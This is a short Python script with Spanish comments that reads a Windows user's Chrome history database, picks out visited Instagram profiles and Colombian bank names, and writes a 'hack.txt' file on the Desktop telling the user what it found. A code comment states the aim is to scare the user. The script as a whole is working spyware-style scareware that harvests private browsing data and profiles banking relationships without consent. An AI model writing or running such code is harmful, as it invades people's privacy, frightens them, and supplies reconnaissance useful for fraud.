import os
from pathlib import Path
from shutil import copyfile
from time import sleep
import sqlite3
import re




# asusta al usuario filtrando las cuentas que visita de instagram
def scare_user(chrome_history):
    result_finish = "None"
    profile_visited = []
    for item in chrome_history:
        results = re.findall("https://www.instagram.com/([A-Za-z0-9]+)/$", item[2])
        if results and results[0] not in ["reels", "explore"]:
            profile_visited.append(results[0])
            result_finish = "He visto que haz visitado los siguientes perfiles de instagram: {}".format(", ".join(profile_visited))
    print(result_finish)
    return result_finish


def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = "{}/AppData/Local/Google/Chrome/User Data/Default/History".format(user_path)
            history_temp = history_path + "temp"
            copyfile(history_path, history_temp)
            connection = sqlite3.connect(history_temp)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url from urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            return urls

        except sqlite3.OperationalError:
            print("Historial inaccesible, reintentando en 3 seg...")
            sleep(3)


def create_hacker_file(profile_visited, user_path):
    r_desktop_path = "{}/Desktop/".format(user_path)
    #r_desktop_path = "D:\\Escritorio\\"
    with open(r_desktop_path + "hack.txt", "a") as hack_file:
        hack_file.write(profile_visited)


def bank_accounts(chrome_history):
    banks = ["bancolombia", "davivienda", "lulo bank", "banco de bogota", "bbva", "banco caja social", "nequi"]
    bank_accounts = []
    for item in chrome_history:
        for b in banks:
            if b.lower() in item[0].lower():
                if b not in bank_accounts:
                    bank_accounts.append(b)
            else:
                pass
    result_finish = "\nTienes cuenta de banco en: {} ".format(", ".join(bank_accounts))

    return result_finish


def get_user_path():
    return "{}/".format(Path.home())


def main():
    user_path = get_user_path()
    chrome_history = get_chrome_history(user_path)
    hack_data = scare_user(chrome_history)
    bank_data = bank_accounts(chrome_history)
    create_hacker_file(hack_data, user_path)
    create_hacker_file(bank_data, user_path)


if __name__ == '__main__':
    main()